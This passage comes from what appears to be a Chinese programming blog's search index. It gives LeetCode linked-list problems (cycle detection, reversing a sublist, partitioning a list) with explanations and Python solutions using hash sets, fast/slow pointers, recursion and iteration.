class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">-4</span>]</span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    new_a=createLink_rearinsert_cycle(head,pos)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.detectCycle(new_a)</span><br><span class="line">    print(p)</span><br></pre></td></tr></table></figure><pre><code>&lt;__main__.ListNode object at 0x000001CED72B6208&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】141.环形链表I</title>
      <link href="2020/11/19/LeetCode-A-%E9%93%BE%E8%A1%A8-141.%20%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/19/LeetCode-A-%E9%93%BE%E8%A1%A8-141.%20%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>判断链表是否有环</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个链表，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。</p><p>如果链表中存在环，则返回 true 。 否则，返回 false 。</p><p>进阶：</p><p>你能用 O(1)（即，常量）内存解决此问题吗？</p><p>示例1：</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201119circularlinkedlist.png" align="left"><pre><code>输入：head = [3,2,0,-4], pos = 1输出：true解释：链表中有一个环，其尾部连接到第二个节点。</code></pre><p>示例2：</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201119circularlinkedlist_test2.png" align="left"><pre><code>输入：head = [1,2], pos = 0输出：true解释：链表中有一个环，其尾部连接到第一个节点。</code></pre><p>示例3：</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201119circularlinkedlist_test3.png" align="left"><pre><code>输入：head = [1], pos = -1输出：false解释：链表中没有环。</code></pre><p>提示：</p><p>链表中节点的数目范围是 $[0, 10^4]$</p><p>$-10^5 &lt;= Node.val &lt;= 10^5$</p><p>pos 为 -1 或者链表中的一个 有效索引 。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：哈希表"><a href="#方法一：哈希表" class="headerlink" title="方法一：哈希表"></a>方法一：哈希表</h3><ul><li>思路及算法</li></ul><p>最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</p><p>具体地，我们可以使用哈希表来存储所有已经访问过的节点。每次我们到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。重复这一过程，直到我们遍历完整个链表即可。</p><ul><li>复杂度分析</li></ul><p>时间复杂度：O(N)，其中 N 是链表中的节点数。最坏情况下我们需要遍历每个节点一次。</p><p>空间复杂度：O(N)，其中N 是链表中的节点数。主要为哈希表的开销，最坏情况下我们需要将每个节点插入到哈希表中一次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert_cycle</span><span class="params">(lista,pos)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lista)):</span><br><span class="line">        new_node=ListNode(lista[i])</span><br><span class="line">        <span class="keyword">if</span> i==pos:</span><br><span class="line">            pos_node = new_node</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">if</span> pos!=<span class="number">-1</span>:</span><br><span class="line">        rear.next=pos_node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span><span class="params">(self, head: ListNode)</span> -&gt; bool:</span></span><br><span class="line">        seen = set()</span><br><span class="line">        <span class="keyword">while</span> head:</span><br><span class="line">            <span class="keyword">if</span> head <span class="keyword">in</span> seen:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            seen.add(head)</span><br><span class="line">            head = head.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">-4</span>]</span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    new_a=createLink_rearinsert_cycle(head,pos)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.hasCycle(new_a)</span><br><span class="line">    print(p)</span><br></pre></td></tr></table></figure><pre><code>True</code></pre><h3 id="方法二：快慢指针"><a href="#方法二：快慢指针" class="headerlink" title="方法二：快慢指针"></a>方法二：快慢指针</h3><ul><li><p>思路及算法</p><p>  本方法需要读者对「Floyd 判圈算法」（又称龟兔赛跑算法）有所了解。</p><p>  假想「乌龟」和「兔子」在链表上移动，「兔子」跑得快，「乌龟」跑得慢。当「乌龟」和「兔子」从链表上的同一个节点开始移动时，如果该链表中没有环，那么「兔子」将一直处于「乌龟」的前方；如果该链表中有环，那么「兔子」会先于「乌龟」进入环，并且一直在环内移动。等到「乌龟」进入环时，由于「兔子」的速度快，它一定会在某个时刻与乌龟相遇，即套了「乌龟」若干圈。</p><p>  我们可以根据上述思路来解决本题。具体地，我们定义两个指针，一快一满。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。这样一来，如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。</p></li><li><p>细节</p><p>  为什么我们要规定初始时慢指针在位置 head，快指针在位置 head.next，而不是两个指针都在位置 head（即与「乌龟」和「兔子」中的叙述相同）？</p><p>  观察下面的代码，我们使用的是 while 循环，循环条件先于循环体。由于循环条件一定是判断快慢指针是否重合，如果我们将两个指针初始都置于 head，那么 while 循环就不会执行。因此，我们可以假想一个在 head 之前的虚拟节点，慢指针从虚拟节点移动一步到达 head，快指针从虚拟节点移动两步到达 head.next，这样我们就可以使用 while 循环了。</p><p>  当然，我们也可以使用 do-while 循环。此时，我们就可以把快慢指针的初始值都置为 head。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert_cycle</span><span class="params">(lista,pos)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lista)):</span><br><span class="line">        new_node=ListNode(lista[i])</span><br><span class="line">        <span class="keyword">if</span> i==pos:</span><br><span class="line">            pos_node = new_node</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">if</span> pos!=<span class="number">-1</span>:</span><br><span class="line">        rear.next=pos_node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span><span class="params">(self, head: ListNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> <span class="keyword">not</span> head.next:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        slow = head</span><br><span class="line">        fast = head.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> slow != fast:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> fast <span class="keyword">or</span> <span class="keyword">not</span> fast.next:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            slow = slow.next</span><br><span class="line">            fast = fast.next.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">-4</span>]</span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    new_a=createLink_rearinsert_cycle(head,pos)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.hasCycle(new_a)</span><br><span class="line">    print(p)</span><br></pre></td></tr></table></figure><pre><code>True</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】92. 反转链表II</title>
      <link href="2020/11/18/LeetCode-A-%E9%93%BE%E8%A1%A8-92.%20%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8%20II/"/>
      <url>2020/11/18/LeetCode-A-%E9%93%BE%E8%A1%A8-92.%20%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8%20II/</url>
      
        <content type="html"><![CDATA[<p>链表反转</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。说明:1 ≤ m ≤ n ≤ 链表长度。示例:输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：递归"><a href="#方法一：递归" class="headerlink" title="方法一：递归"></a>方法一：递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseBetween</span><span class="params">(self, head, m, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        left, right = head, head</span><br><span class="line">        stop = <span class="literal">False</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">recurseAndReverse</span><span class="params">(right, m, n)</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> left, stop</span><br><span class="line"></span><br><span class="line">            <span class="comment"># base case. Don't proceed any further</span></span><br><span class="line">            <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Keep moving the right pointer one step forward until (n == 1)</span></span><br><span class="line">            right = right.next</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Keep moving left pointer to the right until we reach the proper node</span></span><br><span class="line">            <span class="comment"># from where the reversal is to start.</span></span><br><span class="line">            <span class="keyword">if</span> m &gt; <span class="number">1</span>:</span><br><span class="line">                left = left.next</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Recurse with m and n reduced.</span></span><br><span class="line">            recurseAndReverse(right, m - <span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># In case both the pointers cross each other or become equal, we</span></span><br><span class="line">            <span class="comment"># stop i.e. don't swap data any further. We are done reversing at this</span></span><br><span class="line">            <span class="comment"># point.</span></span><br><span class="line">            <span class="keyword">if</span> left == right <span class="keyword">or</span> right.next == left:</span><br><span class="line">                stop = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Until the boolean stop is false, swap data between the two pointers     </span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> stop:</span><br><span class="line">                left.val, right.val = right.val, left.val</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Move left one step to the right.</span></span><br><span class="line">                <span class="comment"># The right pointer moves one step back via backtracking.</span></span><br><span class="line">                left = left.next           </span><br><span class="line"></span><br><span class="line">        recurseAndReverse(right, m, n)</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.reverseBetween(new_a,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3, 4, 5, 2]</code></pre><h3 id="方法二：迭代"><a href="#方法二：迭代" class="headerlink" title="方法二：迭代"></a>方法二：迭代</h3><p>若有一个三个不同结点组成的链表 <code>A → B → C</code>，实现反转结点中的链接成为 <code>A ← B ← C</code>。</p><ul><li><p>试想两个结点翻转时，令pre指针指向A，cur指向B</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">third &#x3D; cur.next # 方便找到一结点</span><br><span class="line">cur.next &#x3D; prev</span><br><span class="line">prev &#x3D; cur</span><br><span class="line">cur &#x3D; third</span><br></pre></td></tr></table></figure></li><li><p>迭代实现上述过程即可完成链表翻转</p></li><li><p>如上所述，我们需要两个指针 prev 和 cur。</p></li><li><p>prev 指针初始化为 None，cur 指针初始化为链表的 head。</p></li><li><p>一步步地向前推进 cur 指针，prev 指针跟随其后。</p></li><li><p>如此推进两个指针，直到 cur 指针到达从链表头起的第 m 个结点。这就是我们反转链表的起始位置。</p></li><li><p>注意我们要引入两个额外指针，分别称为 tail 和 con。tail 指针指向从链表头起的第m个结点，此结点是反转后链表的尾部，故称为 tail。con 指针指向第 m 个结点的前一个结点，此结点是新链表的头部。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseBetween</span><span class="params">(self, head, m, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Empty list</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Move the two pointers until they reach the proper starting point</span></span><br><span class="line">        <span class="comment"># in the list.</span></span><br><span class="line">        cur, prev = head, <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> m &gt; <span class="number">1</span>:</span><br><span class="line">            prev = cur</span><br><span class="line">            cur = cur.next</span><br><span class="line">            m, n = m - <span class="number">1</span>, n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The two pointers that will fix the final connections.</span></span><br><span class="line">        tail, con = cur, prev</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Iteratively reverse the nodes until n becomes 0.</span></span><br><span class="line">        <span class="keyword">while</span> n:</span><br><span class="line">            third = cur.next</span><br><span class="line">            cur.next = prev</span><br><span class="line">            prev = cur</span><br><span class="line">            cur = third</span><br><span class="line">            n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Adjust the final connections as explained in the algorithm</span></span><br><span class="line">        <span class="keyword">if</span> con:</span><br><span class="line">            con.next = prev</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = prev</span><br><span class="line">        tail.next = cur</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.reverseBetween(new_a,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3, 4, 5, 2]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】86. 分隔链表</title>
      <link href="2020/11/17/LeetCode-A-%E9%93%BE%E8%A1%A8-86.%20%E5%88%86%E9%9A%94%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/17/LeetCode-A-%E9%93%BE%E8%A1%A8-86.%20%E5%88%86%E9%9A%94%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>链表分隔。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。你应当保留两个分区中每个节点的初始相对位置。</code></pre><p> 示例:</p><pre><code>输入: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><ul><li>双指针法，创建两个带头结点（哑结点）的指针before_x和after_x</li><li>遍历链表<ul><li>将小于x的值添加到链表before_x中</li><li>大于等于x的值添加到链表after_x中</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span><span class="params">(self, head: ListNode, x: int)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="comment"># before_x构造小于x的节点链表,利用头结点，也即哑结点</span></span><br><span class="line">        before_x = ListNode(<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># after_x 构造大于x的结点链表</span></span><br><span class="line">        after_x=ListNode(<span class="number">-1</span>)</span><br><span class="line">        b=before_x</span><br><span class="line">        a=after_x</span><br><span class="line">        <span class="comment"># 遍历head</span></span><br><span class="line">        <span class="keyword">while</span> head!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> head.val&lt;x:</span><br><span class="line">                b.next=head</span><br><span class="line">                b=head</span><br><span class="line">                head=head.next</span><br><span class="line">                b.next=<span class="literal">None</span></span><br><span class="line">            <span class="keyword">elif</span> head!=<span class="literal">None</span>:</span><br><span class="line">                a.next=head</span><br><span class="line">                a=head</span><br><span class="line">                head=head.next</span><br><span class="line">                a.next=<span class="literal">None</span></span><br><span class="line">        b.next=after_x.next</span><br><span class="line">        <span class="keyword">return</span> before_x.next</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    x=<span 